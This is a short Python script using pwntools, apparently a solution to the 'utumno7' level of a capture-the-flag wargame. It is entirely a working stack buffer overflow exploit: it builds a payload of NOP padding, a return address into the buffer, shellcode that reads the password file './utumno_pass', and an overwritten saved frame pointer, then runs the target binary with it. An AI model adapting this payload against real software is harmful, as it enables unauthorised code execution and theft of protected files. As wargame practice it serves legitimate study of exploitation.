#!/bin/python3

from pwn import *

filepath='./utumno_pass'
addr_ebp = 0xffffcd9c
addr_eip = addr_ebp + 8

elf = context.binary = ELF('./utumno7')

payload = b''
payload = payload.ljust(4, b'\x90')
payload += p32(addr_eip + 20)
payload += b'\x90' * 40
payload += asm(shellcraft.cat(filepath))
payload = payload.ljust(140, b'A')
payload += p32(addr_ebp)

p = process(argv=['./utumno7', payload.decode('latin-1')])

with open("payload.b", "wb") as file:
    file.write(payload)

log.info(p.recv(timeout=1))
